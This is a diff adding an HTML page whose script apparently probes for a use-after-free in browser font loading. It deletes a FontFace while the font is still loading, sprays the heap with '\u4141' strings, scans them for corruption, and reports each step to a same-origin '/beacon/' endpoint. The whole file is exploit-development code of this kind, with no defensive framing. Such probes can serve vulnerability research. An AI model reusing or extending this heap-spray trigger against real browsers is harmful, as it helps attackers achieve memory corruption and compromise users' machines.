@@ -1,0 +1,44 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>slow</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+b('SL-PARSE');
+window.onerror=function(msg,src,line){b('SL-ERROR-'+line+'-'+String(msg).slice(0,40));return false;};
+window.__spray = [];
+(function(){
+function run(){
+  b('SL-START');
+  var f = new FontFace('x', 'url("/slowfont/?ms=2000")');
+  document.fonts.add(f);
+  b('SL-ADDED-size' + document.fonts.size);
+  documents_load();
+  function documents_load(){
+    document.fonts.load('1em x').then(
+      function(){ b('SL-RESOLVED'); },
+      function(){ b('SL-REJECTED'); }
+    );
+    b('SL-LOAD-CALLED');
+    setTimeout(function(){
+      try { document.fonts.delete(f); } catch(e) { b('SL-DELERR'); }
+      b('SL-DELETED-size' + document.fonts.size);
+      for (var i = 0; i < 800; i++) {
+        var arr = new Array(128).fill("\u4141");
+        window.__spray.push(arr.join(""));
+      }
+      b('SL-SPRAYED-' + window.__spray.length);
+    }, 100);
+    setTimeout(function(){
+      b('SL-T2000');
+    }, 2000);
+    setTimeout(function(){
+      b('SL-T3500');
+      var v = window.__spray[0] || "", diffs = 0, first = -1, fv = -1;
+      for (var i = 0; i < v.length; i++) { var c = v.charCodeAt(i); if (c !== 0x4141) { diffs++; if (first < 0) { first = i; fv = c; } } }
+      b('SL-SCAN-len' + v.length + '-diffs' + diffs + '-first' + first + '-val' + fv);
+      b('SL-DONE');
+    }, 3500);
+  }
+}
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+})();
+</script></head><body><p>slow</p></body></html>
